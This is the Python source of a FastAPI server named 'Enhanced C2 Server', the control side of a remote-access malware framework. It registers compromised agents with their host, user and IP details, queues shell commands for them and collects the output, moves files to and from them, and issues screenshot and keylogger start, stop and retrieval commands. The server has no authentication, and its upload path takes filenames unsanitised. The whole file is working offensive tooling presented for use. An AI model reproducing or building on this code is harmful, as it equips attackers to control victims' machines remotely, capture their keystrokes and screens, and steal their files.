from fastapi import FastAPI, HTTPException, status, UploadFile, File, WebSocket, WebSocketDisconnect
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict, Optional
import asyncio
import json
import os
import uuid
import time
import logging
from datetime import datetime
import aiofiles
from pathlib import Path

from config import settings

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize FastAPI app
app = FastAPI(title="Enhanced C2 Server", version="1.0.0")

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# No authentication required

# Create necessary directories
os.makedirs(settings.UPLOAD_DIR, exist_ok=True)
os.makedirs(settings.DOWNLOAD_DIR, exist_ok=True)
os.makedirs("static", exist_ok=True)
os.makedirs("templates", exist_ok=True)

# Mount static files
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# In-memory storage (in production, use a database)
agents: Dict[str, Dict] = {}
commands: Dict[str, List[Dict]] = {}
command_results: Dict[str, List[Dict]] = {}
active_connections: List[WebSocket] = []

# Pydantic models
class AgentRegister(BaseModel):
    agent_id: str
    display_name: Optional[str] = None
    hostname: str
    username: str
    os_info: str
    ip_address: str
    port: int
    cpu_count: Optional[int] = None
    memory_total: Optional[int] = None
    disk_total: Optional[int] = None
    python_version: Optional[str] = None
    architecture: Optional[str] = None
    machine: Optional[str] = None
    processor: Optional[str] = None
    boot_time: Optional[float] = None
    pid: Optional[int] = None
    cwd: Optional[str] = None
    capabilities: Optional[Dict] = {}

class CommandRequest(BaseModel):
    agent_id: str
    command: str
    command_type: str = "shell"

class CommandResult(BaseModel):
    agent_id: str
    command_id: str
    result: str
    success: bool
    timestamp: str

# No authentication models needed

# WebSocket connection manager
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)

    async def send_personal_message(self, message: str, websocket: WebSocket):
        await websocket.send_text(message)

    async def broadcast(self, message: str):
        for connection in self.active_connections:
            try:
                await connection.send_text(message)
            except:
                pass

manager = ConnectionManager()

# Routes
@app.get("/test", response_class=HTMLResponse)
async def test_dashboard():
    with open("tests/test_dashboard.html", "r") as f:
        return HTMLResponse(content=f.read())

@app.get("/", response_class=HTMLResponse)
async def simple_dashboard():
    with open("static/simple_dashboard.html", "r") as f:
        return HTMLResponse(content=f.read())

@app.get("/simple", response_class=HTMLResponse)
async def dashboard():
   with open("static/simple_dashboard.html", "r") as f:
        return HTMLResponse(content=f.read())
        
# No authentication endpoints needed

# Agent management endpoints
@app.post("/api/agents/register")
async def register_agent(agent: AgentRegister):
    agent_id = agent.agent_id
    agent_data = {
        "agent_id": agent_id,
        "display_name": agent.display_name or agent_id,
        "hostname": agent.hostname,
        "username": agent.username,
        "os_info": agent.os_info,
        "ip_address": agent.ip_address,
        "port": agent.port,
        "cpu_count": agent.cpu_count,
        "memory_total": agent.memory_total,
        "disk_total": agent.disk_total,
        "python_version": agent.python_version,
        "architecture": agent.architecture,
        "machine": agent.machine,
        "processor": agent.processor,
        "boot_time": agent.boot_time,
        "pid": agent.pid,
        "cwd": agent.cwd,
        "capabilities": agent.capabilities or {},
        "last_seen": datetime.utcnow().isoformat(),
        "status": "online"
    }
    
    agents[agent_id] = agent_data
    commands[agent_id] = []
    command_results[agent_id] = []
    
    logger.info("Agent {} registered from {} with capabilities: {}".format(
        agent_id, agent.ip_address, agent.capabilities))
    
    # Notify dashboard
    await manager.broadcast(json.dumps({
        "type": "agent_update",
        "agents": agents,
        "command_count": sum(len(cmd_list) for cmd_list in commands.values()),
        "success_rate": "100%"
    }))
    
    return {"message": "Agent registered successfully", "agent_id": agent_id}

@app.get("/api/agents")
async def get_agents():
    return {"agents": agents}

@app.delete("/api/agents/{agent_id}")
async def remove_agent(agent_id: str):
    if agent_id in agents:
        del agents[agent_id]
        if agent_id in commands:
            del commands[agent_id]
        if agent_id in command_results:
            del command_results[agent_id]
        
        logger.info("Agent {} removed".format(agent_id))
        
        # Notify dashboard
        await manager.broadcast(json.dumps({
            "type": "agent_update",
            "agents": agents,
            "command_count": sum(len(cmd_list) for cmd_list in commands.values()),
            "success_rate": "100%"
        }))
        
        return {"message": "Agent removed successfully"}
    else:
        raise HTTPException(status_code=404, detail="Agent not found")

@app.post("/api/agents/{agent_id}/heartbeat")
async def agent_heartbeat(agent_id: str):
    if agent_id in agents:
        agents[agent_id]["last_seen"] = datetime.utcnow().isoformat()
        agents[agent_id]["status"] = "online"
        return {"message": "Heartbeat received"}
    else:
        raise HTTPException(status_code=404, detail="Agent not found")

# Command execution endpoints
@app.post("/api/commands/execute")
async def execute_command(command_req: CommandRequest):
    if command_req.agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    command_id = str(uuid.uuid4())
    command_data = {
        "command_id": command_id,
        "agent_id": command_req.agent_id,
        "command": command_req.command,
        "command_type": command_req.command_type,
        "timestamp": datetime.utcnow().isoformat(),
        "status": "pending"
    }
    
    commands[command_req.agent_id].append(command_data)
    
    logger.info("Command {} queued for agent {}: {}".format(command_id, command_req.agent_id, command_req.command))
    
    # Notify dashboard
    await manager.broadcast(json.dumps({
        "type": "log",
        "message": "Command queued for agent {}: {}".format(command_req.agent_id, command_req.command)
    }))
    
    return {"message": "Command queued successfully", "command_id": command_id}

@app.get("/api/commands/{agent_id}")
async def get_commands(agent_id: str):
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    return {"commands": commands.get(agent_id, [])}

@app.post("/api/commands/result")
async def submit_command_result(result: CommandResult):
    if result.agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    result_data = {
        "command_id": result.command_id,
        "agent_id": result.agent_id,
        "result": result.result,
        "success": result.success,
        "timestamp": result.timestamp
    }
    
    command_results[result.agent_id].append(result_data)
    
    # Update command status
    for cmd in commands[result.agent_id]:
        if cmd["command_id"] == result.command_id:
            cmd["status"] = "completed"
            break
    
    logger.info("Command result received from agent {}: {}".format(result.agent_id, result.success))
    
    # Notify dashboard
    await manager.broadcast(json.dumps({
        "type": "command_result",
        "result": result_data
    }))
    
    return {"message": "Command result received"}

@app.get("/api/commands/{agent_id}/results")
async def get_command_results(agent_id: str):
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    return {"results": command_results.get(agent_id, [])}

@app.delete("/api/commands/{agent_id}/results")
async def clear_command_results(agent_id: str):
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    command_results[agent_id] = []
    logger.info("Cleared command results for agent {}".format(agent_id))
    await manager.broadcast(json.dumps({
        "type": "command_results_cleared",
        "agent_id": agent_id
    }))
    return {"message": "Command results cleared"}

# File transfer endpoints
@app.post("/api/files/upload")
async def upload_file(file: UploadFile = File(...)):
    file_path = os.path.join(settings.UPLOAD_DIR, file.filename)
    
    async with aiofiles.open(file_path, 'wb') as f:
        content = await file.read()
        await f.write(content)
    
    logger.info("File uploaded: {}".format(file.filename))
    
    return {"message": "File uploaded successfully", "filename": file.filename, "path": file_path}

@app.get("/api/files/download/{filename}")
async def download_file(filename: str):
    file_path = os.path.join(settings.DOWNLOAD_DIR, filename)
    
    if not os.path.exists(file_path):
        raise HTTPException(status_code=404, detail="File not found")
    
    return FileResponse(file_path, filename=filename)

@app.get("/api/files/list")
async def list_files():
    upload_files = []
    download_files = []
    
    for file in os.listdir(settings.UPLOAD_DIR):
        file_path = os.path.join(settings.UPLOAD_DIR, file)
        if os.path.isfile(file_path):
            upload_files.append({
                "filename": file,
                "size": os.path.getsize(file_path),
                "modified": datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat()
            })
    
    for file in os.listdir(settings.DOWNLOAD_DIR):
        file_path = os.path.join(settings.DOWNLOAD_DIR, file)
        if os.path.isfile(file_path):
            download_files.append({
                "filename": file,
                "size": os.path.getsize(file_path),
                "modified": datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat()
            })
    
    return {"upload_files": upload_files, "download_files": download_files}


# Enhanced C2 endpoints for advanced features
@app.post("/api/commands/screenshot")
async def take_screenshot(command_req: CommandRequest):
    """Queue a screenshot command for an agent that supports it"""
    if command_req.agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    # Check if agent supports screenshot capability
    agent_caps = agents[command_req.agent_id].get("capabilities", {})
    if not agent_caps.get("screenshot", False):
        raise HTTPException(status_code=400, detail="Agent does not support screenshots")
    
    # Create the screenshot command
    command_id = str(uuid.uuid4())
    command_data = {
        "command_id": command_id,
        "agent_id": command_req.agent_id,
        "command": "SCREENSHOT",
        "command_type": "special",
        "timestamp": datetime.utcnow().isoformat(),
        "status": "pending"
    }
    
    commands[command_req.agent_id].append(command_data)
    
    logger.info("Screenshot command {} queued for agent {}".format(command_id, command_req.agent_id))
    
    # Notify dashboard
    await manager.broadcast(json.dumps({
        "type": "log",
        "message": "Screenshot command queued for agent {}".format(command_req.agent_id)
    }))
    
    return {"message": "Screenshot command queued successfully", "command_id": command_id}


@app.post("/api/commands/keylogger/start")
async def start_keylogger(agent_id: str):
    """Start keylogger on agent that supports it"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    # Check if agent supports keylogger capability
    agent_caps = agents[agent_id].get("capabilities", {})
    if not agent_caps.get("keylogger", False):
        raise HTTPException(status_code=400, detail="Agent does not support keylogger")
    
    # Create the keylogger start command
    command_id = str(uuid.uuid4())
    command_data = {
        "command_id": command_id,
        "agent_id": agent_id,
        "command": "KEYLOG_START",
        "command_type": "special",
        "timestamp": datetime.utcnow().isoformat(),
        "status": "pending"
    }
    
    commands[agent_id].append(command_data)
    
    logger.info("Keylogger start command {} queued for agent {}".format(command_id, agent_id))
    
    # Notify dashboard
    await manager.broadcast(json.dumps({
        "type": "log",
        "message": "Keylogger start command queued for agent {}".format(agent_id)
    }))
    
    return {"message": "Keylogger start command queued successfully", "command_id": command_id}


@app.post("/api/commands/keylogger/stop")
async def stop_keylogger(agent_id: str):
    """Stop keylogger on agent that supports it"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    # Check if agent supports keylogger capability
    agent_caps = agents[agent_id].get("capabilities", {})
    if not agent_caps.get("keylogger", False):
        raise HTTPException(status_code=400, detail="Agent does not support keylogger")
    
    # Create the keylogger stop command
    command_id = str(uuid.uuid4())
    command_data = {
        "command_id": command_id,
        "agent_id": agent_id,
        "command": "KEYLOG_STOP",
        "command_type": "special",
        "timestamp": datetime.utcnow().isoformat(),
        "status": "pending"
    }
    
    commands[agent_id].append(command_data)
    
    logger.info("Keylogger stop command {} queued for agent {}".format(command_id, agent_id))
    
    # Notify dashboard
    await manager.broadcast(json.dumps({
        "type": "log",
        "message": "Keylogger stop command queued for agent {}".format(agent_id)
    }))
    
    return {"message": "Keylogger stop command queued successfully", "command_id": command_id}


@app.post("/api/commands/keylogger/data")
async def get_keylogger_data(agent_id: str):
    """Get keylogger data from agent"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    # Check if agent supports keylogger capability
    agent_caps = agents[agent_id].get("capabilities", {})
    if not agent_caps.get("keylogger", False):
        raise HTTPException(status_code=400, detail="Agent does not support keylogger")
    
    # Create the keylogger data command
    command_id = str(uuid.uuid4())
    command_data = {
        "command_id": command_id,
        "agent_id": agent_id,
        "command": "KEYLOG_DATA",
        "command_type": "special",
        "timestamp": datetime.utcnow().isoformat(),
        "status": "pending"
    }
    
    commands[agent_id].append(command_data)
    
    logger.info("Keylogger data command {} queued for agent {}".format(command_id, agent_id))
    
    # Notify dashboard
    await manager.broadcast(json.dumps({
        "type": "log",
        "message": "Keylogger data command queued for agent {}".format(agent_id)
    }))
    
    return {"message": "Keylogger data command queued successfully", "command_id": command_id}


@app.get("/api/agents/{agent_id}/info")
async def get_agent_info(agent_id: str):
    """Get comprehensive agent system information"""
    if agent_id not in agents:
        raise HTTPException(status_code=404, detail="Agent not found")
    
    agent_info = agents[agent_id]
    
    return {
        "agent_id": agent_info["agent_id"],
        "display_name": agent_info["display_name"],
        "hostname": agent_info["hostname"],
        "username": agent_info["username"],
        "os_info": agent_info["os_info"],
        "ip_address": agent_info["ip_address"],
        "cpu_count": agent_info["cpu_count"],
        "memory_total": agent_info["memory_total"],
        "disk_total": agent_info["disk_total"],
        "python_version": agent_info["python_version"],
        "architecture": agent_info["architecture"],
        "machine": agent_info["machine"],
        "processor": agent_info["processor"],
        "boot_time": agent_info["boot_time"],
        "pid": agent_info["pid"],
        "cwd": agent_info["cwd"],
        "capabilities": agent_info["capabilities"],
        "last_seen": agent_info["last_seen"],
        "status": agent_info["status"]
    }


@app.get("/api/agents/enhanced")
async def get_enhanced_agents():
    """Get list of agents with enhanced information"""
    enhanced_agents = {}
    for agent_id, agent_data in agents.items():
        enhanced_agents[agent_id] = {
            "agent_id": agent_data["agent_id"],
            "display_name": agent_data["display_name"],
            "hostname": agent_data["hostname"],
            "username": agent_data["username"],
            "os_info": agent_data["os_info"],
            "ip_address": agent_data["ip_address"],
            "capabilities": agent_data["capabilities"],
            "last_seen": agent_data["last_seen"],
            "status": agent_data["status"]
        }
    
    return {"enhanced_agents": enhanced_agents}

# WebSocket endpoint for real-time updates
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            # Echo back the message (for testing)
            await manager.send_personal_message("Echo: {}".format(data), websocket)
    except WebSocketDisconnect:
        manager.disconnect(websocket)

# Health check endpoint
@app.get("/api/health")
async def health_check():
    return {
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat(),
        "agents_count": len(agents),
        "commands_count": sum(len(cmd_list) for cmd_list in commands.values())
    }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host=settings.SERVER_HOST, port=settings.SERVER_PORT)
